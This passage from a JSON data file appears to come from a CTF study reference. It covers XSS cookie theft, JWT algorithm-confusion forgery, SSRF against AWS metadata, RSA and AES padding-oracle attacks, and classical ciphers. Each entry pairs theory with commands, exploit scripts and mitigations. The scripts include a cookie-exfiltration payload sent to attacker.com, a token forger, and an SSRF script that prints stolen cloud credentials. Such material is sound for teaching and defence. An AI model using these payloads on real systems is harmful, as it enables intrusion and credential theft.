      "exploit_code": "#!/usr/bin/env python3\nimport requests\n\nTARGET = \"http://target.ctf/create\"\nEXFIL_URL = \"http://attacker.com/leak?cookie=\"\n\npayload = f\"<script>navigator.sendBeacon('{EXFIL_URL}' + encodeURIComponent(document.cookie));<\\/script>\"\nr = requests.post(TARGET, data={\"title\": \"Test\", \"content\": payload})\nnote_id = r.json()[\"id\"]\n\nprint(f\"[+] Reporting note {note_id} to admin bot...\")\nrequests.post(\"http://target.ctf/report\", data={\"id\": note_id})\nprint(\"[+] Awaiting exfiltration on listener...\")",
      "flag": "CTF{XSS_D0M_C00K1E_TH1EF_2026}",
      "mitigation": "Set the `HttpOnly` flag on all sensitive session cookies so client scripts cannot access them. Implement context-aware output encoding (DOMPurify for HTML) and enforce a strict CSP (`script-src 'nonce-...'`)."
    }
  },
  "web-auth-jwt": {
    "id": "web-auth-jwt",
    "domain": "web",
    "category": "Web Security & Authentication",
    "title": "JSON Web Token (JWT) Cryptanalysis & Session Forgery",
    "subtitle": "Compact JWS/JWE Framing, Algorithm Confusion (RS256->HS256), None-Alg & JKU Injection",
    "diagram": "+-----------------------------------------------------------------+\n|                    JWT Structural Architecture                  |\n+-----------------------------------------------------------------+\n[ Header ]                    [ Payload ]               [ Signature ]\n{\"alg\":\"RS256\",\"typ\":\"JWT\"} . {\"user\":\"alice\",\"role\":\"user\"} . [ Binary HMAC / RSA ]\n  |                              |                            |\n  +-- Base64URL-encoded          +-- Base64URL-encoded        +-- Base64URL-encoded\n\nATTACK VECTORS:\n1. Alg: None Attack:\n   Change Header to {\"alg\":\"none\"}. Delete signature!\n   -> Server with naive parser accepts unsigned token!\n\n2. RS256 -> HS256 Key Confusion:\n   Server expects RS256 (verifies with RSA Public Key).\n   Attacker changes alg to HS256 (symmetric HMAC).\n   Server verifies signature using its RSA Public Key AS THE HMAC SECRET KEY!\n   Attacker has the public key, so attacker can forge valid signatures!",
    "theory": "JSON Web Tokens (JWT, RFC 7519) are compact, URL-safe data transfer tokens widely utilized in modern single-page applications (SPAs) and stateless REST API architectures for claims assertion and authentication state. A JSON Web Signature (JWS) comprises three dot-separated Base64URL-encoded segments: `Header.Payload.Signature`.\n\nProminent Cryptographic & Parser Failure Classes:\n1. The 'None' Algorithm Vulnerability (CVE-2015-9235): The JWS specification includes an `alg: \"none\"` value designed for unsecured tokens. If a backend authentication library verifies tokens by dynamically inspecting the header's `alg` field without enforcing an application-mandated algorithm whitelist, an attacker can modify the payload (e.g. `{\"role\": \"admin\"}`), set `alg: \"none\"`, and strip the signature entirely (`header.payload.`). The server treats the token as valid.\n2. Algorithm Confusion (Asymmetric to Symmetric / RS256 to HS256): In RS256, the server signs tokens using a private RSA key and verifies them using a public RSA key. If the attacker tampers with the header to specify `alg: \"HS256\"`, an insecure library may invoke `jwt.verify(token, server_public_key)`. But for HS256, the verification function treats the second parameter NOT as an RSA key, but as a raw symmetric shared secret! Because the public key is publicly accessible, the attacker signs the forged token with the public key bytes using HMAC-SHA256, producing a signature the server accepts.\n3. JKU (JWK Set URL) Header Injection: Some JWT implementations permit the header to specify a `jku` parameter pointing to a remote JSON Web Key Set file (`https://.../.well-known/jwks.json`). If the server does not validate the host domain, the attacker hosts their own key pair on an external server and sets `jku` to their own URL, signing the token with their own private key.",
    "commands": [
      {
        "cmd": "python3 -c \"import jwt; print(jwt.encode({'user':'admin','role':'admin'}, '', algorithm='none'))\"",
        "why": "Generates an unsigned JWT with none-algorithm for testing authorization bypasses.",
        "when": "Testing initial JWT verification implementations.",
        "internals": "Base64URL encodes header and payload; signature segment is left empty.",
        "pitfalls": "PyJWT >= 2.0 strictly requires explicit algorithm specification; use older or custom formatting for testing."
      },
      {
        "cmd": "jwt_tool <TOKEN> -X a",
        "why": "Automates automated testing of the 'alg: none' vulnerability across multiple variations.",
        "when": "Automated security scanning of API tokens.",
        "internals": "Tests uppercase 'NONE', lowercase 'none', 'None', and trailing dot variations.",
        "pitfalls": "Ensure jwt_tool dependencies are installed in virtual environment."
      },
      {
        "cmd": "jwt_tool <TOKEN> -S hs256 -k public.pem",
        "why": "Executes the RS256 to HS256 algorithm confusion attack using the server's public key.",
        "when": "When target application uses asymmetric RSA signatures and public key is known.",
        "internals": "Calculates HMAC-SHA256 digest using public key file bytes as secret key.",
        "pitfalls": "Public key format (PKCS#1 vs PKCS#8 vs raw SPKI) must match the exact string format expected by target server library."
      }
    ],
    "cli_vs_gui": {
      "cli_workflow": "CLI: Python script using `hashlib` and `base64` creates forged token in 5 lines without external dependencies.",
      "gui_workflow": "Burp Suite: JWT Editor extension. Automatically highlights, parses, signs, and attacks JWT tokens in Repeater.",
      "speed_tip": "In CyberChef: Use 'JWT Decode' recipe to inspect header and claims immediately without terminal commands."
    },
    "triage_workflow": [
      "1. Capture Token: Extract `Bearer <token>` from Authorization header or cookie.",
      "2. Decode Segments: Inspect header `alg` and payload claims.",
      "3. Test None Algorithm: Re-encode with `alg: 'none'` and empty signature.",
      "4. Check for Weak Secrets: If HS256, run `hashcat -m 16500 jwt.txt rockyou.txt`.",
      "5. Test Key Confusion: If RS256, obtain public key (e.g. from `/jwks.json` or SSL cert) and sign with HS256.",
      "6. Submit Forged Token: Access protected endpoint `/api/admin`."
    ],
    "writeup": {
      "ctf_event": "DEF CON Qualifier / HackTheBox",
      "challenge_name": "Auth-Confused (JWT RS256 to HS256)",
      "scenario": "A target bank API authorizes transfers using JWTs signed with RS256. The server public key is available at http://target.ctf/public.key.",
      "solve_steps": [
        "1. Download public key: `curl -s http://target.ctf/public.key > pub.key`.",
        "2. Decode current user token: `{'user': 'guest', 'admin': false}`.",
        "3. Modify payload to: `{'user': 'admin', 'admin': true}`.",
        "4. Modify header to: `{'alg': 'HS256', 'typ': 'JWT'}`.",
        "5. Sign new token with HMAC-SHA256 using the raw bytes of `pub.key` as the secret key.",
        "6. Send request with forged token: `curl -H 'Authorization: Bearer ...' http://target.ctf/admin/flag`.",
        "7. Flag: CTF{JWT_ALGORITHM_CONFUSION_PWN}"
      ],
      "exploit_code": "#!/usr/bin/env python3\nimport hmac, hashlib, base64, json\n\npub_key = open(\"pub.key\", \"rb\").read()\n\nheader = {\"alg\": \"HS256\", \"typ\": \"JWT\"}\npayload = {\"user\": \"admin\", \"admin\": True}\n\ndef b64url(data):\n    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()\n\npart1 = b64url(json.dumps(header).encode())\npart2 = b64url(json.dumps(payload).encode())\nunsigned = f\"{part1}.{part2}\".encode()\n\nsig = hmac.new(pub_key, unsigned, hashlib.sha256).digest()\ntoken = f\"{part1}.{part2}.{b64url(sig)}\"\nprint(\"[+] Forged Token:\\n\", token)",
      "flag": "CTF{JWT_ALGORITHM_CONFUSION_PWN}",
      "mitigation": "Hardcode the expected algorithm server-side (e.g. `jwt.verify(token, key, algorithms=['RS256'])`). Never allow the token header's `alg` value to choose the verification algorithm."
    }
  },
  "web-ssrf": {
    "id": "web-ssrf",
    "domain": "web",
    "category": "Web Security & Cloud Pivots",
    "title": "Server-Side Request Forgery (SSRF) & Internal Network Pivoting",
    "subtitle": "Cloud Metadata API Extraction (169.254.169.254), Protocol Smuggling & Gopher Exploitation",
    "diagram": "+-----------------------------------------------------------------+\n|                 Server-Side Request Forgery (SSRF)              |\n+-----------------------------------------------------------------+\nAttacker                    Vulnerable Web Server               Internal Infrastructure\n   |                                 |                                    |\n   | --- POST /fetch?url=... ------->|                                    |\n   |     url=http://169.254.169.254  |                                    |\n   |                                 | --- 1. Queries Cloud Metadata ---->| (AWS IMDS API)\n   |                                 |<--- 2. Returns IAM Credentials ----|\n   |                                 |                                    |\n   |                                 | --- 3. Queries Internal Redis ---->| (gopher://...:6379)\n   |                                 |        Executes CONFIG SET         | (Drops web shell!)\n   |<--- Leaked Credentials / Shell -+                                    |",
    "theory": "Server-Side Request Forgery (SSRF, CWE-918) occurs when a web application fetches a remote resource without validating the user-supplied destination URL. Because the request originates from the trusted server backend rather than the attacker's client browser, the request bypasses network perimeter firewalls, network address translation (NAT), and VPC routing rules.\n\nHigh-Impact SSRF Target Vectors:\n1. Cloud Instance Metadata Services (IMDS):\n   Cloud providers expose a link-local non-routable IP address (`169.254.169.254`) accessible only from within virtual machine instances.\n   - AWS IMDSv1: `GET http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>`. Returns temporary AWS SecretAccessKey, AccessKeyId, and Token.\n   - AWS IMDSv2: Requires a `PUT` request with `X-aws-ec2-metadata-token-ttl-seconds: 21600` to retrieve a session token, defeating basic GET-only SSRF vulnerabilities.\n   - GCP: Requires the header `Metadata-Flavor: Google`.\n   - DigitalOcean: `http://169.254.169.254/metadata/v1.json`.\n2. Protocol Smuggling via Gopher (`gopher://`):\n   The Gopher protocol (RFC 1436) transmits arbitrary raw bytes over TCP without framing or handshakes. Attackers utilize gopher URLs (`gopher://127.0.0.1:6379/_<URL-encoded-payload>`) to interact with internal unauthenticated services, such as:\n   - Redis: Executing `CONFIG SET dir /var/www/html` and `CONFIG SET dbfilename shell.php` to drop web shells.\n   - Memcached: Dumping session tokens and cached credentials.\n   - FastCGI: Interacting directly with PHP-FPM on port 9000 to achieve instant remote code execution.",
    "commands": [
      {
        "cmd": "curl -s 'http://target.ctf/proxy?url=http://169.254.169.254/latest/meta-data/'",
        "why": "Tests for AWS Cloud Metadata accessibility via server-side proxy endpoint.",
        "when": "Testing web applications hosted on AWS EC2 or Elastic Beanstalk.",
        "internals": "Hypervisor virtual networking layer intercepts link-local 169.254.169.254 queries.",
        "pitfalls": "Fails if IMDSv2 is enforced or server-side URL parser validates IP prefixes."
      },
      {
        "cmd": "curl -s 'http://target.ctf/proxy?url=http://2130706433:80/'",
        "why": "Bypasses naive IP blacklists checking for '127.0.0.1' or 'localhost' by using decimal integer representation of loopback.",
        "when": "Target application validates URL with regex for 127.0.0.1.",
        "internals": "Operating system resolver parses 2130706433 as 0x7F000001 (127.0.0.1).",
        "pitfalls": "Alternative representations: hex (0x7f000001), octal (0177.0.0.1), or IPv6 (::1)."
      },
      {
        "cmd": "gopherus --exploit redis",
        "why": "Generates gopher payloads to exploit internal Redis daemons and write web shells or SSH keys.",
        "when": "SSRF confirmed and target server has internal Redis running on port 6379.",
        "internals": "Constructs Redis RESP protocol commands formatted into a gopher URL.",
        "pitfalls": "Requires cURL or underlying HTTP client library to have Gopher protocol enabled (disabled by default in some modern distributions)."
      }
    ],
    "cli_vs_gui": {
      "cli_workflow": "CLI: `curl 'http://target/fetch?url=gopher://127.0.0.1:6379/_...` spawns shell in seconds.",
      "gui_workflow": "Burp Collaborator: Generate unique collaborator domain -> inject into SSRF parameter -> observe DNS/HTTP interaction in Collaborator tab.",
      "speed_tip": "If 127.0.0.1 is filtered, use public DNS services that resolve to localhost, such as `127.0.0.1.nip.io` or `localtest.me`."
    },
    "triage_workflow": [
      "1. Identify Remote Fetching Functionality: Webhooks, PDF generators, avatar URLs, file upload via URL.",
      "2. Probe Internal Loopback: Test `http://127.0.0.1/`, `http://localhost/`, `http://[::]:80/`.",
      "3. Bypass Filters: Test decimal IPs (`2130706433`), DNS rebinding, or URL redirects.",
      "4. Query Cloud Metadata: Test `http://169.254.169.254/latest/meta-data/`.",
      "5. Port Scan Internal Network: Iterate port numbers 1..1000 on 127.0.0.1 to identify listening internal services.",
      "6. Exploit Internal Services: Smuggle commands to Redis (6379), SMTP (25), or PHP-FPM (9000)."
    ],
    "writeup": {
      "ctf_event": "Google CTF / HackTheBox",
      "challenge_name": "Cloud-Puppy (SSRF to AWS IMDS Credentials)",
      "scenario": "A web application generates website previews using a URL input parameter. The backend runs on an AWS EC2 instance.",
      "solve_steps": [
        "1. Test loopback: `http://127.0.0.1/` returns 'Access Denied: Local IP blocked'.",
        "2. Bypass IP filter using decimal representation: `http://2130706433/` returns internal status page.",
        "3. Target AWS metadata: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`.",
        "4. Discovers role name: `s3-flag-reader`.",
        "5. Query role credentials: `.../security-credentials/s3-flag-reader`.",
        "6. Receives AWS AccessKeyId, SecretAccessKey, and Token.",
        "7. Configure AWS CLI locally and dump S3 bucket: `aws s3 cp s3://company-flags/flag.txt .`.",
        "8. Flag: CTF{SSRF_CL0UD_M3T4D4T4_AWS_PWN3D}"
      ],
      "exploit_code": "#!/usr/bin/env python3\nimport requests, json\n\nTARGET = \"http://target.ctf/preview?url=\"\nIMDS = \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"\n\nr = requests.get(TARGET + IMDS)\nrole = r.text.strip()\nprint(\"[+] Discovered Role:\", role)\n\ncreds = requests.get(TARGET + IMDS + role).json()\nprint(\"[+] AccessKeyId:\", creds[\"AccessKeyId\"])\nprint(\"[+] SecretAccessKey:\", creds[\"SecretAccessKey\"])\nprint(\"[+] Token:\", creds[\"Token\"])",
      "flag": "CTF{SSRF_CL0UD_M3T4D4T4_AWS_PWN3D}",
      "mitigation": "Enforce IMDSv2 across cloud environments (requires PUT token header). Disallow private and loopback IP ranges in backend HTTP clients using strict URL validation and dedicated firewall egress policies."
    }
  },
  "crypto-rsa": {
    "id": "crypto-rsa",
    "domain": "crypto",
    "category": "Asymmetric Cryptography",
    "title": "RSA Mathematical Foundations, Prime Factorization & Key Recovery",
    "subtitle": "Euler's Totient, Modular Arithmetic, Small Exponent Cube Roots, Fermat Factorization & Wiener's Attack",
    "diagram": "+-------------------------------------------------------------+\n|                      RSA Key Generation                     |\n|  1. Choose primes p, q                                      |\n|  2. Modulus: n = p * q                                      |\n|  3. Totient: phi(n) = (p - 1) * (q - 1)                     |\n|  4. Public Exponent: e (commonly 65537 or 3)                |\n|  5. Private Exponent: d = inverse(e, phi(n)) (e*d = 1 mod phi)|\n+-------------------------------------------------------------+\n        |                                             |\n        v                                             v\n  [ Encryption ]                                [ Decryption ]\n  c = m^e (mod n)                               m = c^d (mod n)\n\nATTACK TAXONOMY:\n- If e=3 and m^3 < n:               m = integer_cube_root(c) (No mod reduction!)\n- If |p - q| < 2 * n^(1/4):         Fermat Factorization (a = ceil(sqrt(n)))\n- If d < (1/3) * n^(1/4):           Wiener's Attack (Continued Fractions)\n- If same message encrypted under 3 keys with e=3: Hastad's Broadcast (CRT)",
    "theory": "The Rivest-Shamir-Adleman (RSA) cryptosystem is the foundation of public-key cryptography. Its mathematical security relies on the hardness of the integer factorization problem: while computing the product of two large prime numbers $n = p \\times q$ is computationally trivial ($O(b^2)$ bit operations), recovering the constituent primes $p$ and $q$ from $n$ alone is computationally intractable for general integers using current classical algorithms (the General Number Field Sieve runs in sub-exponential time $O(\\exp((c+o(1))(\\ln n)^{1/3}(\\ln \\ln n)^{2/3}))$).\n\nMathematical Invariants & Parameters:\n- Public Modulus: $n = p \\times q$. Bit size typically 2048 to 4096 bits.\n- Euler's Totient Function: $\\phi(n) = (p-1)(q-1)$. Carmichael's totient $\\lambda(n) = \\text{lcm}(p-1, q-1)$ is mathematically optimal.\n- Public Exponent $e$: Must satisfy $\\gcd(e, \\phi(n)) = 1$. Standard value is $65537 = 2^{16} + 1$ (0x10001, low Hamming weight accelerates modular exponentiation).\n- Private Exponent $d$: Computed via the Extended Euclidean Algorithm such that $e \\cdot d \\equiv 1 \\pmod{\\phi(n)}$.\n\nProminent CTF Attack Classes:\n1. Small Public Exponent ($e=3$) without OAEP Padding: If message $m$ is short ($m < n^{1/3}$), then $m^3 < n$. The modular reduction operator $\\pmod n$ never activates! Ciphertext $c = m^3$ in the integers. Plaintext is trivially recovered via exact integer cube root: $m = \\lfloor c^{1/3} \\rfloor$.\n2. Fermat's Factorization (Close Primes): If prime factors $p$ and $q$ are chosen too close together ($|p-q| < 2 n^{1/4}$), then $n = a^2 - b^2 = (a+b)(a-b)$ where $a = (p+q)/2 \\approx \\sqrt{n}$. The algorithm starts at $a = \\lceil \\sqrt{n} \\rceil$ and iterates $a \\leftarrow a + 1$ until $a^2 - n$ is a perfect square $b^2$.\n3. Wiener's Continued Fraction Attack (Small Private Exponent): If $d < \\frac{1}{3} n^{1/4}$, the fraction $\\frac{k}{d}$ appears as one of the convergents in the continued fraction expansion of $\\frac{e}{n}$. Computing the continued fraction expansion allows complete recovery of $d$ in polynomial time.",
    "commands": [
      {
        "cmd": "python3 -c \"import gmpy2; m, exact = gmpy2.iroot(c, 3); print(m.to_bytes((m.bit_length()+7)//8, 'big'))\"",
        "why": "Extracts exact integer cube root of ciphertext c when e=3 and unpadded RSA is used.",
        "when": "Public key has e=3 and ciphertext integer value is small.",
        "internals": "Invokes GMP library multi-precision integer root calculation.",
        "pitfalls": "Fails if message was padded with PKCS#1 v1.5 or OAEP padding."
      },
      {
        "cmd": "RsaCtfTool -n <N> -e <E> --uncipher <C> --attack all",
        "why": "Automates dozens of common CTF RSA attack classes (Wiener, Fermat, Pollard p-1, Boneh-Durfee, ECM).",
        "when": "When mathematical vulnerability is not immediately obvious from parameters.",
        "internals": "Executes modular factorization heuristics sequentially against target modulus.",
        "pitfalls": "Can take hours if modulus is standard 2048-bit with random secure primes. Check parameters manually first."
      },
      {
        "cmd": "openssl rsa -pubin -text -noout -in pubkey.pem",
        "why": "Extracts modulus n (hex and decimal) and exponent e from PEM-encoded public key file.",
        "when": "First step of analyzing provided public key files in CTF challenges.",
        "internals": "Parses ASN.1 DER/PEM structure to read RSAPublicKey sequence.",
        "pitfalls": "Large moduli will wrap lines in terminal; use python script to extract exact integer values."
      }
    ],
    "cli_vs_gui": {
      "cli_workflow": "Python with `gmpy2` and `pycryptodome`: load parameters -> run factorization -> compute `pow(c, d, n)` -> print flag in under 1 second.",
      "gui_workflow": "CyberChef / Web FactorDB: Paste modulus into factordb.com -> check if primes are already pre-computed in database.",
      "speed_tip": "Always check factordb.com first! CTF authors frequently choose primes that have already been submitted to FactorDB."
    },
    "triage_workflow": [
      "1. Extract Parameters: Parse $n$, $e$, and ciphertext $c$ as integers.",
      "2. Query FactorDB: Check if $n$ is already factored on factordb.com.",
      "3. Check Exponent $e$: If $e=3$, test integer cube root ($c^{1/3}$). If multiple ciphertexts exist, use Hastad's CRT.",
      "4. Check Prime Closeness: Test Fermat's factorization (`isqrt(n)`).",
      "5. Check Exponent Size: If $e$ is large (near $n$), $d$ is likely small; run Wiener's attack.",
      "6. Calculate Private Key: $\\phi = (p-1)(q-1)$, $d = e^{-1} \\pmod \\phi$, $m = c^d \\pmod n$."
    ],
    "writeup": {
      "ctf_event": "CryptoHack / PlaidCTF",
      "challenge_name": "Wiener-Small-D (Continued Fractions)",
      "scenario": "A target server uses an RSA public key with a massive 2048-bit exponent e. Ciphertext c is provided.",
      "solve_steps": [
        "1. Inspect parameters: e is almost as large as n (2046 bits).",
        "2. Large e implies the private exponent d was chosen small to accelerate decryption.",
        "3. Wiener's theorem: If d < (1/3) * n^(1/4), d is the denominator of a convergent of e/n.",
        "4. Compute continued fraction expansion of e/n in Python.",
        "5. Generate convergents k/d and test each candidate d by computing m = pow(c, d, n).",
        "6. Convergent #47 yields candidate d that decrypts to valid ASCII text.",
        "7. Flag: CTF{W13N3R_C0NT1NU3D_FR4CT10N_PWN}"
      ],
      "exploit_code": "#!/usr/bin/env python3\nfrom fractions import Fraction\nimport gmpy2\n\ndef wiener_attack(e, n):\n    cf = []\n    num, den = e, n\n    while den:\n        cf.append(num // den)\n        num, den = den, num % den\n    for i in range(len(cf)):\n        k, d = 0, 1\n        for j in reversed(cf[:i+1]):\n            k, d = d, j*d + k\n        if k == 0 or (e*d - 1) % k != 0:\n            continue\n        phi = (e*d - 1) // k\n        b = n - phi + 1\n        disc = b*b - 4*n\n        if disc >= 0:\n            sq, exact = gmpy2.isqrt_rem(disc)\n            if exact == 0:\n                return d\n    return None\n\n# Load c, e, n and decrypt\n# print(pow(c, d, n).to_bytes(...))",
      "flag": "CTF{W13N3R_C0NT1NU3D_FR4CT10N_PWN}",
      "mitigation": "Always select standard public exponent e = 65537 and ensure private exponent d >= 2^(n_bits / 2) to prevent continued fraction attacks."
    }
  },
  "crypto-aes": {
    "id": "crypto-aes",
    "domain": "crypto",
    "category": "Symmetric Cryptography",
    "title": "AES Block Cipher Modes, ECB Visual Artifacts & Padding Oracle Attacks",
    "subtitle": "Rijndael Substitution-Permutation Network, CBC Decryption XOR Math & PKCS#7 Padding Oracles",
    "diagram": "+-------------------------------------------------------------+\n|                 AES-CBC Decryption Block n                  |\n+-------------------------------------------------------------+\nCiphertext C[n] ---> [ AES Decrypt with Key K ] ---> Intermediate I[n]\n                                                            |\n                                                            v\nCiphertext C[n-1] ------------------------------------> [ XOR ]\n                                                            |\n                                                            v\n                                                     Plaintext P[n]\n\nPADDING ORACLE ATTACK LOGIC:\nAttacker controls C[n-1]!\nBy modifying C[n-1][15] and observing padding validation errors,\nattacker determines when (C[n-1][15] ^ I[n][15]) == 0x01 (valid pad)!\nTherefore: I[n][15] = C[n-1][15] ^ 0x01!\nOnce Intermediate I[n] is known:\nPlaintext P[n] = I[n] ^ Original_C[n-1]! Decrypted without the key!",
    "theory": "The Advanced Encryption Standard (AES, FIPS 197) is a symmetric block cipher operating on fixed 128-bit (16-byte) state blocks using key lengths of 128, 192, or 256 bits. Built upon a Substitution-Permutation Network (SPN), AES executes 10, 12, or 14 rounds consisting of four algebraic operations: SubBytes (non-linear S-Box substitution over GF(2\u2078)), ShiftRows (cyclical byte transposition), MixColumns (linear matrix diffusion over polynomial rings), and AddRoundKey (bitwise XOR with round subkeys).\n\nModes of Operation & CTF Attack Vectors:\n1. ECB (Electronic Codebook) Mode: Each 16-byte block is encrypted independently using the same key: $C_i = \\text{AES}_K(P_i)$. Identical plaintext blocks produce identical ciphertext blocks (illustrated by the famous visual 'ECB Penguin'). Attackers reorder, duplicate, or delete blocks without detection.\n2. CBC (Cipher Block Chaining) Mode: Each plaintext block is XORed with the preceding ciphertext block before encryption: $C_i = \\text{AES}_K(P_i \\oplus C_{i-1})$, where $C_0$ is the Initialization Vector (IV). Decryption: $P_i = \\text{AES}_K^{-1}(C_i) \\oplus C_{i-1}$.\n3. PKCS#7 Padding Oracle Attack (Vaudenay, 2002): In CBC mode, plaintexts must align to 16-byte boundaries using PKCS#7 padding (e.g. 1 byte missing = `\\x01`, 3 bytes missing = `\\x03\\x03\\x03`). If a server leaks whether decrypted ciphertext has valid PKCS#7 padding (via HTTP 500 error vs HTTP 200, or timing differences), an attacker can decrypt ANY ciphertext block-by-block without ever learning the secret encryption key.\n4. CBC Bit-Flipping: Because $P_n = I_n \\oplus C_{n-1}$, flipping bit $k$ of ciphertext block $C_{n-1}$ inverts bit $k$ in the decrypted plaintext block $P_n$. Attackers tamper with tokens (e.g. changing `admin=0` to `admin=1`).",
    "commands": [
      {
        "cmd": "python3 -c \"from Crypto.Cipher import AES; print('PyCryptodome ready')\"",
        "why": "Verifies availability of hardware-accelerated cryptographic primitives.",
        "when": "Pre-flight environment verification on CTF workstation.",
        "internals": "Loads C-extensions for AES-NI hardware instruction sets.",
        "pitfalls": "Ensure pycryptodome is used, not deprecated pycrypto."
      },
      {
        "cmd": "padbuster http://target/auth?token=CIPHERTEXT CIPHERTEXT 16 -error 'Invalid padding'",
        "why": "Automates byte-by-byte padding oracle decryption across web cookies and parameters.",
        "when": "Server leaks distinct error messages upon padding failure.",
        "internals": "Issues 256 requests per byte testing padding validation predicates.",
        "pitfalls": "Network jitter can disrupt decryption; use multithreaded Python scripts for stability."
      }
    ],
    "cli_vs_gui": {
      "cli_workflow": "Python script using `requests` and multiprocessing: send 256 queries per byte, deduce intermediate byte, decrypt full message in ~3 minutes.",
      "gui_workflow": "CyberChef: 'AES Decrypt' recipe. Useful only when the 16-byte key and IV are already known. For cryptanalysis, Python scripts are required.",
      "speed_tip": "When attacking padding oracles, test guess byte 0x00 first if plaintext is ASCII (since high bytes are rarely valid pad in early rounds)."
    },
    "triage_workflow": [
      "1. Identify Cipher Mode: Check ciphertext length (must be multiple of 16 bytes for AES).",
      "2. Test for Padding Errors: Flip the last byte of the penultimate block and submit. If server returns a specific error ('Padding error', '500 Internal Server Error'), padding oracle exists.",
      "3. Decrypt Last Byte of Block: Modify C[n-1][15] from 0 to 255 until server accepts padding (pad = 0x01).",
      "4. Calculate Intermediate: `Intermediate[15] = guess_byte ^ 0x01`.",
      "5. Plaintext Recovery: `Plaintext[15] = Intermediate[15] ^ Original_C[n-1][15]`.",
      "6. Repeat Across All Bytes: Move backward from byte 15 to 0, and block by block."
    ],
    "writeup": {
      "ctf_event": "DEF CON CTF / CryptoHack",
      "challenge_name": "Padding-Oracle-CBC (Block-by-Block Decryption)",
      "scenario": "A financial portal transmits session tokens encrypted with AES-CBC. Submitting corrupted tokens displays 'Decryption Error: Invalid PKCS#7 padding'.",
      "solve_steps": [
        "1. Intercept session cookie: 48 bytes (IV + 2 blocks of 16 bytes).",
        "2. Confirm padding oracle: Modifying byte 31 returns padding error; modifying byte 0 returns valid signature error.",
        "3. Write padding oracle exploit script querying target endpoint.",
        "4. Recover intermediate state bytes for block 2, then block 1.",
        "5. XOR intermediate states with original preceding ciphertext blocks to reveal plaintext.",
        "6. Plaintext revealed: `user=admin;role=superadmin;flag=CTF{P4DD1NG_0R4CL3_CBC_D3CRYPT}`."
      ],
      "exploit_code": "#!/usr/bin/env python3\nimport requests\n\nTARGET = \"http://target.ctf/auth?token=\"\n\ndef oracle(token_hex):\n    r = requests.get(TARGET + token_hex)\n    return \"Invalid PKCS#7\" not in r.text\n\ndef decrypt_block(prev_block, target_block):\n    intermediate = [0] * 16\n    plaintext = [0] * 16\n    for byte_idx in range(15, -1, -1):\n        pad_val = 16 - byte_idx\n        crafted_prev = [0] * 16\n        for k in range(byte_idx + 1, 16):\n            crafted_prev[k] = intermediate[k] ^ pad_val\n        for guess in range(256):\n            crafted_prev[byte_idx] = guess\n            test_payload = bytes(crafted_prev) + target_block\n            if oracle(test_payload.hex()):\n                intermediate[byte_idx] = guess ^ pad_val\n                plaintext[byte_idx] = intermediate[byte_idx] ^ prev_block[byte_idx]\n                break\n    return bytes(plaintext)",
      "flag": "CTF{P4DD1NG_0R4CL3_CBC_D3CRYPT}",
      "mitigation": "Use Authenticated Encryption (AES-GCM or ChaCha20-Poly1305). If using CBC, always apply the Encrypt-then-MAC paradigm with HMAC-SHA256 and verify the MAC in constant time before decryption."
    }
  },
  "crypto-classical": {
    "id": "crypto-classical",
    "domain": "crypto",
    "category": "Classical & Historical Cryptography",
    "title": "Classical Cryptanalysis, Frequency Distributions & Multi-Byte XOR",
    "subtitle": "Index of Coincidence (IoC), Kasiski Examination, Vigen\u00e8re Inversion & Hamming Distance Key Lengths",
    "diagram": "+-----------------------------------------------------------------+\n|                  Multi-Byte XOR & Vigen\u00e8re Analysis             |\n+-----------------------------------------------------------------+\nCiphertext: 1f 0a 34 12 0c 5e ...\n  |\n  +-> 1. Determine Key Length (k):\n  |     - Normalized Hamming Distance across adjacent k-byte blocks\n  |     - Index of Coincidence: IoC = sum(f_i * (f_i - 1)) / (N * (N - 1))\n  |       English text IoC ~= 0.0667 | Random text IoC ~= 0.0385\n  |\n  +-> 2. Transpose into k independent Single-Byte Streams:\n  |     Stream 0: c[0], c[k],   c[2k], ...\n  |     Stream 1: c[1], c[k+1], c[2k+1], ...\n  |\n  +-> 3. Single-Byte Frequency Scoring:\n        Score each candidate byte (0..255) against English letter frequencies (ETAOIN SHRDLU)!",
    "theory": "Classical ciphers manipulate plaintext characters at the syntactic level through substitution (replacing symbols) and transposition (reordering symbols). While obsolete in modern engineering, classical cryptanalysis concepts\u2014frequency distributions, entropy, modular arithmetic, and the Index of Coincidence\u2014are foundational to understanding modern stream ciphers and CTF puzzles.\n\nMathematical Invariants & Statistical Measures:\n1. Index of Coincidence (IoC): The probability that two randomly selected letters from a ciphertext are identical. For an alphabet of size $c$ and character frequencies $f_i$:\n$$IoC = \\frac{\\sum_{i=1}^c f_i (f_i - 1)}{N(N - 1)}$$\nFor English plaintext, $IoC \\approx 0.0667$. For random uniformly distributed text, $IoC \\approx 1/26 \\approx 0.0385$. Monoalphabetic substitution ciphers preserve the exact IoC of the underlying language.\n2. Vigen\u00e8re Cipher & Multi-Byte XOR: Polyalphabetic ciphers use a repeating key to encrypt characters. If the key length is $k$, every $k$-th character is encrypted with the same single-byte key. The attack proceeds in two phases:\n   - Phase 1: Determine key length $k$ using Kasiski examination (finding distances between repeated ciphertext n-grams) or calculating the average Hamming distance between chunks of size $k$.\n   - Phase 2: Transpose the ciphertext into $k$ independent slices and solve each slice as a monoalphabetic substitution or single-byte XOR against English frequency tables (E: 12.7%, T: 9.1%, A: 8.2%, O: 7.5%, I: 7.0%, N: 6.7%).",
    "commands": [
      {
        "cmd": "python3 -c \"import collections; d=open('cipher.txt').read(); print(collections.Counter(d).most_common(10))\"",
        "why": "Computes character frequency table to identify substitution cipher characteristics.",
        "when": "Initial triage of classical cipher challenges.",
        "internals": "Counts occurrences of each unique byte/character.",
        "pitfalls": "If text is very short (< 100 chars), frequency statistics deviate from standard English distributions."
      },
      {
        "cmd": "xortool -l 10 -c 20 cipher.bin",
        "why": "Automates key-length determination and multi-byte XOR decryption based on character frequencies.",
        "when": "Dealing with unknown multi-byte XOR encrypted binary blobs.",
        "internals": "Calculates normalized Hamming distances and tests space-character frequencies.",
        "pitfalls": "Assumes underlying plaintext is predominantly ASCII English text."
      }
    ],
    "cli_vs_gui": {
      "cli_workflow": "CLI: `xortool cipher.bin` -> automatically guesses key length and writes decrypted candidates to `xortool_out/`.",
      "gui_workflow": "CyberChef: 'Vigen\u00e8re Decode', 'Rot13', or 'Bake' with 'Entropy' and 'Frequency analysis'.",
      "speed_tip": "In CyberChef, use the 'Magic' recipe with intensive search enabled to automatically recognize Base64, Hex, XOR, and compression."
    },
    "triage_workflow": [
